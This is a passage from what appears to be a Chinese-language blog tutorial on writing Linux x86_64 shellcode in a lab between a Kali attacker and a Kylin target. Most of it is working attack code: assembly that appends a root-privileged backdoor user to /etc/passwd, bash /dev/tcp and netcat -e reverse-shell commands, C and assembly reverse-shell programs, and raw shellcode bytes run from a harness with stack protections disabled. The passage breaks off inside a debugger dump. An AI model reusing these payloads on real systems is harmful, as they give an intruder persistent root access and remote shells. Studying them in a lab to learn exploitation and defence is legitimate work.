class="line">;http://www.shell-storm.org/shellcode/files/shellcode-801.php</span><br><span class="line">;sc_adduser01.S</span><br><span class="line">;Arch:          x86_64, Linux</span><br><span class="line">;</span><br><span class="line">;Author:        0_o -- null_null</span><br><span class="line">;           nu11.nu11 [at] yahoo.com</span><br><span class="line">;Date:          2012-03-05</span><br><span class="line">;</span><br><span class="line">\</span><br><span class="line">;Purpose:       adds user &quot;t0r&quot; with password &quot;Winner&quot; to /etc/passwd</span><br><span class="line">;executed syscalls:     setreuid, setregid, open, write, close, exit</span><br><span class="line">;Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash</span><br><span class="line">;syscall op codes:  /usr/include/x86_64-linux-gnu/asm/unistd_64.h</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    ;sys_setreuid(uint ruid, uint euid)</span><br><span class="line">    xor     rax,    rax</span><br><span class="line">    mov     al,     113                     ;syscall sys_setreuid</span><br><span class="line">    xor     rbx,    rbx                     ;arg 1 -- set real uid to root</span><br><span class="line">    mov     rcx,    rbx                     ;arg 2 -- set effective uid to root</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;sys_setregid(uint rgid, uint egid)</span><br><span class="line">    xor     rax,    rax</span><br><span class="line">    mov     al,     114                     ;syscall sys_setregid</span><br><span class="line">    xor     rbx,    rbx                     ;arg 1 -- set real uid to root</span><br><span class="line">    mov     rcx,    rbx                     ;arg 2 -- set effective uid to root</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;push all strings on the stack prior to file operations.</span><br><span class="line">    xor rbx,    rbx</span><br><span class="line">    mov     ebx,    0x647773FF</span><br><span class="line">    shr     rbx,    8</span><br><span class="line">    push    rbx                             ;string \00dws</span><br><span class="line">    mov     rbx,    0x7361702f6374652f</span><br><span class="line">    push    rbx                             ;string sap/cte/</span><br><span class="line">    mov     rbx,    0x0A687361622F6EFF</span><br><span class="line">    shr     rbx,    8</span><br><span class="line">    push    rbx                             ;string \00\nhsab/n</span><br><span class="line">    mov     rbx,    0x69622F3A746F6F72</span><br><span class="line">    push    rbx                             ;string ib/:toor</span><br><span class="line">    mov     rbx,    0x2F3A3A303A303A67</span><br><span class="line">    push    rbx                             ;string /::0:0:g</span><br><span class="line">    mov rbx,    0x46556B554B587435</span><br><span class="line">    push    rbx             ;string FUkUKXt5</span><br><span class="line">    mov rbx,    0x546755333A723074</span><br><span class="line">    push    rbx             ;string TgU3:r0t</span><br><span class="line">    </span><br><span class="line">    ;prelude to doing anything useful...</span><br><span class="line">    mov rbx,    rsp         ;save stack pointer for later use</span><br><span class="line">    push    rbp             ;store base pointer to stack so it can be restored later</span><br><span class="line">    mov rbp,    rsp         ;set base pointer to current stack pointer</span><br><span class="line">    </span><br><span class="line">    ;sys_open(char* fname, int flags, int mode)</span><br><span class="line">    sub rsp,        16</span><br><span class="line">    mov [rbp - 16], rbx     ;store pointer to &quot;t0r..../bash&quot;</span><br><span class="line">    mov si,     0x0401      ;arg 2 -- flags</span><br><span class="line">    mov rdi,        rbx</span><br><span class="line">    add rdi,        40      ;arg 1 -- pointer to &quot;/etc/passwd&quot;</span><br><span class="line">    xor rax,        rax</span><br><span class="line">    mov al,     2       ;syscall sys_open</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;sys_write(uint fd, char* buf, uint size)</span><br><span class="line">    mov [rbp - 4],  eax     ;arg 1 -- fd is retval of sys_open. save fd to stack for later use.</span><br><span class="line">    mov rcx,        rbx     ;arg 2 -- load rcx with pointer to string &quot;t0r.../bash&quot;</span><br><span class="line">    xor rdx,        rdx</span><br><span class="line">    mov dl,     39      ;arg 3 -- load rdx with size of string &quot;t0r.../bash\00&quot;</span><br><span class="line">    mov rsi,        rcx     ;arg 2 -- move to source index register</span><br><span class="line">    mov rdi,        rax     ;arg 1 -- move to destination index register</span><br><span class="line">    xor     rax,            rax</span><br><span class="line">    mov     al,             1               ;syscall sys_write</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;sys_close(uint fd)</span><br><span class="line">    xor rdi,        rdi</span><br><span class="line">    mov edi,        [rbp - 4]   ;arg 1 -- load stored file descriptor to destination index register</span><br><span class="line">    xor rax,        rax</span><br><span class="line">    mov al,     3       ;syscall sys_close</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;sys_exit(int err_code)</span><br><span class="line">    xor rax,    rax</span><br><span class="line">    mov al, 60          ;syscall sys_exit</span><br><span class="line">    xor rbx,    rbx         ;arg 1 -- error code</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><h2 id="5-反向shell"><a class="markdownIt-Anchor" href="#5-反向shell"></a> 5. 反向shell</h2><blockquote><p>参考：</p><p>​<a href="https://zhuanlan.zhihu.com/p/138393396">反弹shell原理与实现</a></p><p>​<a href="https://blog.csdn.net/qinjinghua2012/article/details/42622431">IP地址如何用十六进制表示</a></p><p>​<a href="http://www.shell-storm.org/shellcode/files/shellcode-907.php">Linux/x86-64 - Dynamic null-free reverse TCP shell - 65 bytes</a></p><p>​<a href="http://www.shell-storm.org/shellcode/files/shellcode-167.php">FreeBSD/x86 - reverse connect dl(shellcode) and execute, exit - 90 bytes</a></p><p>​<a href="http://www.shell-storm.org/shellcode/files/shellcode-890.php">Linux/x86-64 - Password Protected Reverse Shell - 136 bytes</a></p><p>​<a href="http://www.shell-storm.org/shellcode/files/shellcode-857.php">Linux/x86-64 - Reverse TCP shell - 118 bytes</a></p><p>​<a href="https://www.cnblogs.com/LittleHann/p/12038070.html">反弹Shell原理及检测技术研究 </a></p><p>​<a href="http://drops.xmd5.com/static/drops/tips-1376.html">使用netcat进行反弹链接的shellcode</a></p></blockquote><h3 id="51-先通过命令来反弹shell"><a class="markdownIt-Anchor" href="#51-先通过命令来反弹shell"></a> 5.1 先通过命令来反弹shell</h3><p>【1】先在攻击端（kali: 192.168.188.141）输入以下命令。</p><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220817211511413.png" alt="image-20220817211511413"></p><p>【2】然后在靶机端（Kylin：192.168.188.146）输入以下命令（两种写法）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.188.146/5566 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/192.168.188.146/5566 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="/2022/08/08/Linux-shellcode%E5%BC%80%E5%8F%91%E4%B9%8B%E5%AE%9E%E6%88%98/image-20220817211654594.png" alt="image-20220817211654594"></p><blockquote><p>具体原理可以参考先知社区上的这两篇文章</p><p>Linux反弹shell（一）文件描述符与重定向</p><p>——<a href="https://xz.aliyun.com/t/2548">https://xz.aliyun.com/t/2548</a></p><p>Linux反弹shell（二）反弹shell的本质</p><p>——<a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p></blockquote><p>不过这种 shell 命令，在用execve中运行会找不到这个 <code>/dev/tcp/...</code> 文件，因此我们只能在靶机端运行 nc 命令：<code>netcat -e /bin/sh 192.168.188.141 5566</code></p><p>但是，如果你直接在 kylin 中运行上面这条命令的话，它会报错显示没有 -e 这条参数。这样就需要我们装一个完整的 netcat，然后再来执行上面这条命令。我将它安装在<code>/home/sakura/tools/netcat</code></p><blockquote><p>安装教程：<a href="https://www.freebuf.com/sectool/243115.html">这可能是netcat最全的使用指南</a></p></blockquote><h3 id="52-再来用c语言来试试可以运行"><a class="markdownIt-Anchor" href="#52-再来用c语言来试试可以运行"></a> 5.2 再来用C语言来试试：（可以运行）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;     </span><br><span class="line"><span class="type">char</span> *name[<span class="number">6</span>];</span><br><span class="line">name[<span class="number">0</span>] = <span class="string">&quot;/home/sakura/tools/netcat/src/netcat&quot;</span>;</span><br><span class="line">name[<span class="number">1</span>] = <span class="string">&quot;-e&quot;</span>;</span><br><span class="line"> name[<span class="number">2</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"> name[<span class="number">3</span>] = <span class="string">&quot;192.168.188.141&quot;</span>;</span><br><span class="line"> name[<span class="number">4</span>] = <span class="string">&quot;5566&quot;</span>;</span><br><span class="line">    name[<span class="number">5</span>] = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">sakura@Kylin:~/文档/execveDir$ gcc -c rev_tcp.c -o rev_tcp.o</span></span><br><span class="line"><span class="comment">sakura@Kylin:~/文档/execveDir$ gcc rev_tcp.o -o rev_tcp -static</span></span><br><span class="line"><span class="comment">sakura@Kylin:~/文档/execveDir$ objdump -sd rev_tcp.o -M intel</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rev_tcp.o：     文件格式 elf64-x86-64</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Contents of section .text:</span></span><br><span class="line"><span class="comment"> 0000 f30f1efa 554889e5 4883ec40 64488b04  ....UH..H..@dH..</span></span><br><span class="line"><span class="comment"> 0010 25280000 00488945 f831c048 8d050000  %(...H.E.1.H....</span></span><br><span class="line"><span class="comment"> 0020 00004889 45c0488d 05000000 00488945  ..H.E.H......H.E</span></span><br><span class="line"><span class="comment"> 0030 c8488d05 00000000 488945d0 488d0500  .H......H.E.H...</span></span><br><span class="line"><span class="comment"> 0040 00000048 8945d848 8d050000 00004889  ...H.E.H......H.</span></span><br><span class="line"><span class="comment"> 0050 45e048c7 45e80000 0000488b 45c0488d  E.H.E.....H.E.H.</span></span><br><span class="line"><span class="comment"> 0060 4dc0ba00 00000048 89ce4889 c7e80000  M......H..H.....</span></span><br><span class="line"><span class="comment"> 0070 0000bf00 000000e8 00000000           ............    </span></span><br><span class="line"><span class="comment">Contents of section .rodata:</span></span><br><span class="line"><span class="comment"> 0000 2f686f6d 652f7361 6b757261 2f746f6f  /home/sakura/too</span></span><br><span class="line"><span class="comment"> 0010 6c732f6e 65746361 742f7372 632f6e65  ls/netcat/src/ne</span></span><br><span class="line"><span class="comment"> 0020 74636174 002d6500 2f62696e 2f736800  tcat.-e./bin/sh.</span></span><br><span class="line"><span class="comment"> 0030 3139322e 3136382e 3138382e 31343100  192.168.188.141.</span></span><br><span class="line"><span class="comment"> 0040 35353636 00                          5566.           </span></span><br><span class="line"><span class="comment">Contents of section .comment:</span></span><br><span class="line"><span class="comment"> 0000 00474343 3a202855 62756e74 7520392e  .GCC: (Ubuntu 9.</span></span><br><span class="line"><span class="comment"> 0010 332e302d 31306b79 6c696e32 2920392e  3.0-10kylin2) 9.</span></span><br><span class="line"><span class="comment"> 0020 332e3000                             3.0.            </span></span><br><span class="line"><span class="comment">Contents of section .note.gnu.property:</span></span><br><span class="line"><span class="comment"> 0000 04000000 10000000 05000000 474e5500  ............GNU.</span></span><br><span class="line"><span class="comment"> 0010 020000c0 04000000 03000000 00000000  ................</span></span><br><span class="line"><span class="comment">Contents of section .eh_frame:</span></span><br><span class="line"><span class="comment"> 0000 14000000 00000000 017a5200 01781001  .........zR..x..</span></span><br><span class="line"><span class="comment"> 0010 1b0c0708 90010000 1c000000 1c000000  ................</span></span><br><span class="line"><span class="comment"> 0020 00000000 7c000000 00450e10 8602430d  ....|....E....C.</span></span><br><span class="line"><span class="comment"> 0030 06000000 00000000                    ........        </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Disassembly of section .text:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">0000000000000000 &lt;main&gt;:</span></span><br><span class="line"><span class="comment">   0:f3 0f 1e fa          endbr64 </span></span><br><span class="line"><span class="comment">   4:55                   push   rbp</span></span><br><span class="line"><span class="comment">   5:48 89 e5             mov    rbp,rsp</span></span><br><span class="line"><span class="comment">   8:48 83 ec 40          sub    rsp,0x40</span></span><br><span class="line"><span class="comment">   c:64 48 8b 04 25 28 00 mov    rax,QWORD PTR fs:0x28</span></span><br><span class="line"><span class="comment">  13:00 00 </span></span><br><span class="line"><span class="comment">  15:48 89 45 f8          mov    QWORD PTR [rbp-0x8],rax</span></span><br><span class="line"><span class="comment">  19:31 c0                xor    eax,eax</span></span><br><span class="line"><span class="comment">  1b:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 22 &lt;main+0x22&gt;</span></span><br><span class="line"><span class="comment">  22:48 89 45 c0          mov    QWORD PTR [rbp-0x40],rax</span></span><br><span class="line"><span class="comment">  26:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 2d &lt;main+0x2d&gt;</span></span><br><span class="line"><span class="comment">  2d:48 89 45 c8          mov    QWORD PTR [rbp-0x38],rax</span></span><br><span class="line"><span class="comment">  31:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 38 &lt;main+0x38&gt;</span></span><br><span class="line"><span class="comment">  38:48 89 45 d0          mov    QWORD PTR [rbp-0x30],rax</span></span><br><span class="line"><span class="comment">  3c:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 43 &lt;main+0x43&gt;</span></span><br><span class="line"><span class="comment">  43:48 89 45 d8          mov    QWORD PTR [rbp-0x28],rax</span></span><br><span class="line"><span class="comment">  47:48 8d 05 00 00 00 00 lea    rax,[rip+0x0]        # 4e &lt;main+0x4e&gt;</span></span><br><span class="line"><span class="comment">  4e:48 89 45 e0          mov    QWORD PTR [rbp-0x20],rax</span></span><br><span class="line"><span class="comment">  52:48 c7 45 e8 00 00 00 mov    QWORD PTR [rbp-0x18],0x0</span></span><br><span class="line"><span class="comment">  59:00 </span></span><br><span class="line"><span class="comment">  5a:48 8b 45 c0          mov    rax,QWORD PTR [rbp-0x40]</span></span><br><span class="line"><span class="comment">  5e:48 8d 4d c0          lea    rcx,[rbp-0x40]</span></span><br><span class="line"><span class="comment">  62:ba 00 00 00 00       mov    edx,0x0</span></span><br><span class="line"><span class="comment">  67:48 89 ce             mov    rsi,rcx</span></span><br><span class="line"><span class="comment">  6a:48 89 c7             mov    rdi,rax</span></span><br><span class="line"><span class="comment">  6d:e8 00 00 00 00       call   72 &lt;main+0x72&gt;</span></span><br><span class="line"><span class="comment">  72:bf 00 00 00 00       mov    edi,0x0</span></span><br><span class="line"><span class="comment">  77:e8 00 00 00 00       call   7c &lt;main+0x7c&gt;</span></span><br><span class="line"><span class="comment">sakura@Kylin:~/文档/execveDir$ </span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="53-然后我们用汇编来写-execve-调用"><a class="markdownIt-Anchor" href="#53-然后我们用汇编来写-execve-调用"></a> 5.3 然后我们用汇编来写 execve 调用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">;execve(&quot;/home/sakura/tools/netcat/src/netcat&quot;, [&quot;/home/sakura/tools/netcat/src/ne&quot;..., &quot;-e&quot;, &quot;/bin/sh&quot;, &quot;192.168.188.141&quot;, &quot;5566&quot;], NULL) = 0</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    sub rsp, 0x40</span><br><span class="line">    mov qword rax, &#x27;5566AAAA&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;188.141A&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;192.168.&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;/bin/shA&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;tcatA-eA&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;t/src/ne&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;ls/netca&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;kura/too&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;/home/sa&#x27;</span><br><span class="line">push rax</span><br><span class="line">    </span><br><span class="line">    xor byte [rsp+36], 0x41</span><br><span class="line">   xor byte [rsp+39], 0x41</span><br><span class="line">   xor byte [rsp+47], 0x41</span><br><span class="line">   xor byte [rsp+63], 0x41</span><br><span class="line">    xor byte [rsp+71], 0x41</span><br><span class="line">    xor byte [rsp+70], 0x41</span><br><span class="line">    xor byte [rsp+69], 0x41</span><br><span class="line">    xor byte [rsp+68], 0x41</span><br><span class="line"></span><br><span class="line">xor rax, rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">push rax</span><br><span class="line">lea rbx, [rdi+64]</span><br><span class="line">push rbx</span><br><span class="line">lea rbx, [rdi+48]</span><br><span class="line">push rbx</span><br><span class="line">lea rbx, [rdi+40]</span><br><span class="line">push rbx</span><br><span class="line">lea rbx, [rdi+37]</span><br><span class="line">push rbx</span><br><span class="line">push rdi</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor rdx, rdx </span><br><span class="line"></span><br><span class="line">   add al , 59</span><br><span class="line">   syscall</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">;/home/sa kura/too ls/netca t/src/ne tcatAAAA </span><br><span class="line">;-eAAAAAA /bin/shA 192.168. 188.141A 5566AAAA&quot;</span><br><span class="line">    </span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">akura@Kylin:~/文档/execveDir$ nasm -f elf64 rev_tcp.asm </span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ld -m elf_x86_64 rev_tcp.o -o rev_tcp</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./rev_tcp</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ for i in $(objdump  -d rev_tcp.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char shellcode[] = \</span><br><span class="line">&quot;\x55\x48\x89\xe5\x48\x83\xec\x40\x48\xb8\x35\x35\x36\x36\x41\x41\x41\x41\x50\x48\xb8\x31\x38\x38\x2e\x31\x34\x31\x41\x50\x48\xb8\x31\x39\x32\x2e\x31\x36\x38\x2e\x50\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x41\x50\x48\xb8\x74\x63\x61\x74\x41\x2d\x65\x41\x50\x48\xb8\x74\x2f\x73\x72\x63\x2f\x6e\x65\x50\x48\xb8\x6c\x73\x2f\x6e\x65\x74\x63\x61\x50\x48\xb8\x6b\x75\x72\x61\x2f\x74\x6f\x6f\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x61\x50\x80\x74\x24\x24\x41\x80\x74\x24\x27\x41\x80\x74\x24\x2f\x41\x80\x74\x24\x3f\x41\x80\x74\x24\x47\x41\x80\x74\x24\x46\x41\x80\x74\x24\x45\x41\x80\x74\x24\x44\x41\x48\x31\xc0\x48\x89\xe7\x50\x48\x8d\x5f\x40\x53\x48\x8d\x5f\x30\x53\x48\x8d\x5f\x28\x53\x48\x8d\x5f\x25\x53\x57\x48\x89\xe6\x48\x31\xd2\x04\x3b\x0f\x05&quot;;</span><br><span class="line">    int (*ret)() = (int(*)())shellcode;</span><br><span class="line">    ret();</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">Usage:</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ gcc rev_tcp.c -o rev_tcp -fno-stack-protector -z execstack -w</span><br><span class="line">sakura@Kylin:~/文档/execveDir$ ./rev_tcp</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h3 id="54-用系统调用建立连接来反弹shell"><a class="markdownIt-Anchor" href="#54-用系统调用建立连接来反弹shell"></a> 5.4 用系统调用建立连接来反弹shell</h3><blockquote><p>参考：<a href="http://www.shell-storm.org/shellcode/files/shellcode-761.php">osx x64 reverse tcp shellcode (131 bytes)</a></p><p>​<a href="https://www.cnblogs.com/kl2blog/p/6908048.html">C语言中结构体占用内存问题</a></p><p>​<a href="https://www.cnblogs.com/b2tang/archive/2009/05/28/1491471.html">Linux下的C语言Socket函数建立TCP连接</a></p><p>​<a href="https://www.cnblogs.com/-oreo/p/10013216.html">linux c语言用socket实现简单的服务器客户端交互</a></p><p>​<a href="https://www.cnblogs.com/YiMingXiaoBuYiMengXiaoNai/p/Linux-C-connect-function.html">2022-08-29-Linux C 中connect函数用法及注意事项</a></p><p>​<a href="https://www.cnblogs.com/mingyue605/p/8783756.html">Linux环境下用C语言实现socket 通信—简单代码</a></p><p>​<a href="https://www.cnblogs.com/zkfopen/p/9441264.html">Linux C/C++ TCP Socket通信实例</a></p><p>​<a href="https://www.cnblogs.com/zkfopen/p/9382705.html">Linux C/C++ UDP Socket通信实例</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span>   <span class="comment">//构造socket所需的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span>  <span class="comment">//定义sockaddr结构</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *shell[<span class="number">2</span>];       <span class="comment">//用于execv调用</span></span><br><span class="line">    <span class="type">int</span> soc,remote;    <span class="comment">//文件描述符句柄</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>;</span> <span class="comment">//保存IP/端口值的结构</span></span><br><span class="line">    soc=socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//192.168.188.141--&gt;0x8dbca8c0</span></span><br><span class="line">    serv_addr.sin_addr.s_addr=<span class="number">0x8dbca8c0</span>;  <span class="comment">//将socket的地址设置为所有本地地址</span></span><br><span class="line">    serv_addr.sin_port=<span class="number">0xbe15</span>;  <span class="comment">//设置socket的端口5566</span></span><br><span class="line">    serv_addr.sin_family=<span class="number">2</span>;   <span class="comment">//设置协议族：IPv4</span></span><br><span class="line"></span><br><span class="line">    remote=connect(soc,(<span class="keyword">struct</span> sockaddr *)&amp;serv_addr,<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    dup2(soc,<span class="number">0</span>);   <span class="comment">//将stdin连接client</span></span><br><span class="line">    dup2(soc,<span class="number">1</span>);   <span class="comment">//将stdout连接client</span></span><br><span class="line">    dup2(soc,<span class="number">2</span>);   <span class="comment">//将strderr连接到client</span></span><br><span class="line">    shell[<span class="number">0</span>]=<span class="string">&quot;/bin/sh&quot;</span>;   <span class="comment">//execve的第一个参数</span></span><br><span class="line">    shell[<span class="number">1</span>]=<span class="number">0</span>;           <span class="comment">//数组的第二个元素为NULL,表示数组结束</span></span><br><span class="line">    execve(shell[<span class="number">0</span>],shell,<span class="literal">NULL</span>);   <span class="comment">//建立一个shell</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我不知道 <code>struct sockaddr_in serv_addr;</code> 结构体在栈上是如何存储的，所以我们来看看它的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000000011c9 